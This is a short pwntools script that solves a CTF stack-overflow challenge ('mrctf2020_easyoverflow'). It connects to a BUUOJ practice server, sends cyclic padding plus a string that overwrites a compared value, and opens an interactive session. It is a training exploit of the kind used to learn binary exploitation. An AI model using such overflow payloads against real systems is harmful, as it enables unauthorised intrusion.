from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('mrctf2020_easyoverflow')
io = remote('node4.buuoj.cn', 27673)

payload = cyclic(0x30) + b'n0t_r3@11y_f1@g'
io.sendline(payload)
io.interactive()

